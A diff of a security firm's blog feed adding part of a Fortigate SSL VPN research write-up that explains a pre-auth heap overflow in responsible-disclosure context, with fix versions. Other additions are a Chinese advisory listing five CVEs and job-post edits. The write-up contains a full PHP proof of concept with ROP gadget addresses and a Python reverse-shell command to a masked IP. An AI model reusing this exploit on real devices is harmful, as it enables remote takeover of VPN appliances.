+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+
+    &lt;p&gt;The crash happened in &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_lib.c#L3716&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SSL_do_handshake()&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
+    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SSL_do_handshake&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
+
+      &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssl_renegotiate_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSL_in_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSL_in_before&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSL_MODE_ASYNC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ASYNC_get_current_job&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+              &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_async_args&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+              &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+              &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_start_async_job&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_do_handshake_intern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+              &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handshake_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;We overwrote the function table inside &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1080&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;struct SSL&lt;/code&gt;&lt;/a&gt; called &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1087&quot;&gt;method&lt;/a&gt;, so when the program trying to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;s-&amp;gt;method-&amp;gt;ssl_renegotiate_check(s, 0);&lt;/code&gt;, it crashed.&lt;/p&gt;
+
+    &lt;p&gt;This is actually an ideal target of our exploit! The allocation of &lt;code class=&quot;highlighter-rouge&quot;&gt;struct SSL&lt;/code&gt; can be triggered easily, and the size is just close to our JaveScript buffer, so it can be nearby our buffer with a regular offset! According to the code, we can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;ret = s-&amp;gt;handshake_func(s);&lt;/code&gt; calls a function pointer, which a perfect choice to control the program flow. With this finding, our exploit strategy is clear.&lt;/p&gt;
+
+    &lt;p&gt;We first &lt;strong&gt;spray&lt;/strong&gt; the heap with SSL structure with lots of normal requests, and then overflow the SSL structure.&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;Here we put our php PoC on an HTTP server:&lt;/p&gt;
+    &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+          &lt;span class=&quot;nv&quot;&gt;$low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;nv&quot;&gt;$high&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;II&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$low&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$high&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4141414141414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$nop_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x32FC078&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nop_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x110FA1A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// # start here # pop r13 ; pop r14 ; pop rbp ; ret ;&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x110fa15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1bed1f6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// pop rax ; ret ;&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x04410f6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// add rdi, rax ; mov eax, dword [rdi] ; ret  ;&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1366639&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// call system ;&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;python -c &#39;import socket,sys,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],12345));[os.dup2(s.fileno(),x) for x in range(3)];os.system(sys.argv[2]);&#39; xx.xxx.xx.xx /bin/sh;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_repeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;AAAAAAAA&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// offset&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_repeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:void(0);&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;The PoC can be divided into three parts.&lt;/p&gt;
+    &lt;ol&gt;
+      &lt;li&gt;
+        &lt;p&gt;Fake SSL structure&lt;br /&gt;
+ The SSL structure has a regular offset to our buffer, so we can forge it precisely. In order to avoid the crash, we set the &lt;code class=&quot;highlighter-rouge&quot;&gt;method&lt;/code&gt; to a place containing a void function pointer. The parameter at this time is SSL structure itself &lt;code class=&quot;highlighter-rouge&quot;&gt;s&lt;/code&gt;. However, there is only 8 bytes ahead of &lt;code class=&quot;highlighter-rouge&quot;&gt;method&lt;/code&gt;. We cannot simply call &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;);&lt;/code&gt; on the HTTP server, so this is not enough for our reverse shell command. Thanks to the huge binary, it is easy to find ROP gadgets. We found one useful for stack pivot:&lt;/p&gt;
+
+        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+        &lt;p&gt;So we set the &lt;code class=&quot;highlighter-rouge&quot;&gt;handshake_func&lt;/code&gt; to this gadget, move the &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; to our SSL structure, and do further ROP attack.&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;ROP chain&lt;br /&gt;
+ The ROP chain here is simple. We slightly move the &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; forward so there is enough space for our reverse shell command.&lt;/li&gt;
+      &lt;li&gt;Overflow string&lt;br /&gt;
+ Finally, we concatenates the overflow padding and exploit. Once we overflow an SSL structure, we get a shell.&lt;/li&gt;
+    &lt;/ol&gt;
+
+    &lt;p&gt;Our exploit requires multiple attempts because we may overflow something important and make the program crash prior to the &lt;code class=&quot;highlighter-rouge&quot;&gt;SSL_do_handshake&lt;/code&gt;. Anyway, the exploit is still stable thanks to the reliable watchdog of Fortigate. It only takes 1~2 minutes to get a reverse shell back.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;demo&quot;&gt;Demo&lt;/h1&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Aw55HqZW4x0&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;h1 id=&quot;timeline&quot;&gt;Timeline&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;11 December, 2018 Reported to Fortinet&lt;/li&gt;
+  &lt;li&gt;19 March, 2019 All fix scheduled&lt;/li&gt;
+  &lt;li&gt;24 May, 2019 All advisory released&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;fix&quot;&gt;Fix&lt;/h1&gt;
+&lt;p&gt;Upgrade to FortiOS 5.4.11, 5.6.9, 6.0.5, 6.2.0 or above.&lt;/p&gt;
+
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Fortigate SSL VPN 資安通報</title>
+   <link href="https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/"/>
+   <updated>2019-08-09T00:00:00-07:00</updated>
+   <id>https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory</id>
+   <content type="html">&lt;h3 id=&quot;內容&quot;&gt;內容&lt;/h3&gt;
+
+&lt;p&gt;上一篇 SSL VPN 研究系列文我們通報了在 &lt;a href=&quot;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&quot;&gt;Palo Alto GlobalProtect 上的 RCE 弱點&lt;/a&gt;，這一篇將公開我們在 Fortigate SSL VPN 上的研究，共計找到下列五個弱點：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;CVE-2018-13379: Pre-auth arbitrary file reading&lt;/li&gt;
+  &lt;li&gt;CVE-2018-13380: Pre-auth XSS&lt;/li&gt;
+  &lt;li&gt;CVE-2018-13381: Pre-auth heap overflow&lt;/li&gt;
+  &lt;li&gt;CVE-2018-13382: The magic backdoor&lt;/li&gt;
+  &lt;li&gt;CVE-2018-13383: Post-auth heap overflow&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;透過不需認證的任意讀檔問題(CVE-2018-13379)加上管理介面上的 heap overflow(CVE-2018-13383)，惡意使用者可直接取得 SSL VPN 的最高權限。&lt;/p&gt;
+
+&lt;p&gt;此外，我們也發現了一個官方後門(CVE-2018-13382)，可以任意修改使用者密碼。&lt;/p&gt;
+
+&lt;p&gt;在回報 Fortigate 後，官方已陸續修復這些弱點，建議 Fortigate SSL VPN 的用戶更新至最新版。&lt;/p&gt;
+
+&lt;h3 id=&quot;細節&quot;&gt;細節&lt;/h3&gt;
+
+&lt;p&gt;詳細的技術細節請參閱我們的 Advisory：&lt;br /&gt;
+&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;附註&quot;&gt;附註&lt;/h3&gt;
+
+&lt;p&gt;這系列 VPN 研究也得到了今年 BlackHat 2019 Pwnie Awards 的 “pwnie for best server-side bug”（年度最佳伺服器漏洞）。&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>[已結束] DEVCORE 徵求行政專員</title>
    <link href="https://devco.re/blog/2019/07/23/devcore-201907-recruit/"/>
-   <updated>2019-07-23T00:00:00+08:00</updated>
+   <updated>2019-07-23T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2019/07/23/devcore-201907-recruit</id>
    <content type="html">&lt;p&gt;戴夫寇爾即將滿七年了，過去我們不斷地鑽研進階攻擊技巧，為許多客戶提供高品質的滲透測試服務，也成為客戶最信賴的資安伙伴之一。在 2017 年我們更成為第一個在台灣推出紅隊演練服務的本土廠商，透過無所不用其極的駭客思維，陸續為電子商務、政府部門、金融業者執行最真實且全面的攻擊演練，同時也累積了豐富的經驗與案例，成為台灣紅隊演練實力最深厚的服務供應商。&lt;/p&gt;
 
@@ -91,6 +404,18 @@
   &lt;li&gt;您是生活駭客&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;您不需要會寫程式，但您習慣觀察生活中的規律，並想辦法利用這些規律有效率的解決問題。&lt;/font&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
+&lt;h3 id=&quot;工作環境&quot;&gt;工作環境&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;您會在一個開闊的辦公環境工作&lt;br /&gt;
+&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_2.jpg&quot; alt=&quot;DEVCORE ENV&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;您會擁有一張 Aeron 人體工學椅&lt;br /&gt;
+&lt;img src=&quot;/assets/img/blog/20150819/devcore_aeron.jpg&quot; alt=&quot;DEVCORE AERON&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;每週補滿飲料（另有咖啡機）、零食，讓您保持心情愉快&lt;br /&gt;
+&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_3.jpg&quot; alt=&quot;DEVCORE DRINK&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;公司提供飛鏢機讓您發洩對主管的怨氣&lt;br /&gt;
+&lt;img src=&quot;/assets/img/blog/20150819/devcore_dart.jpg&quot; alt=&quot;DEVCORE DART&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
 &lt;h3 id=&quot;公司福利&quot;&gt;公司福利&lt;/h3&gt;
 &lt;p&gt;我們注重公司每位同仁的身心健康，請參考以下福利制度：&lt;/p&gt;
 
@@ -143,7 +468,7 @@
   &lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h3 id=&quot;薪資待遇&quot;&gt;薪資待遇&lt;/h3&gt;
+&lt;h3 id=&quot;起薪範圍&quot;&gt;起薪範圍&lt;/h3&gt;
 &lt;p&gt;新台幣 34,000 - 40,000 （保證年薪 14 個月）&lt;/p&gt;
 
 &lt;h3 id=&quot;應徵方式&quot;&gt;應徵方式&lt;/h3&gt;
@@ -179,7 +504,7 @@
  <entry>
    <title>Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!</title>
    <link href="https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/"/>
-   <updated>2019-07-17T00:00:00+08:00</updated>
+   <updated>2019-07-17T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study</id>
    <content type="html">&lt;p&gt;Author: Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) and Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;)&lt;/p&gt;
 
@@ -356,7 +681,7 @@ Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT
  <entry>
    <title>Palo Alto GlobalProtect 資安通報</title>
    <link href="https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/"/>
-   <updated>2019-07-17T00:00:00+08:00</updated>
+   <updated>2019-07-17T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory</id>
    <content type="html">&lt;h3 id=&quot;內容&quot;&gt;內容&lt;/h3&gt;
 
@@ -386,7 +711,7 @@ Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT
  <entry>
    <title>Operation Crack: Hacking IDA Pro Installer PRNG from an Unusual Way</title>
    <link href="https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/"/>
-   <updated>2019-06-21T00:00:00+08:00</updated>
+   <updated>2019-06-21T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en</id>
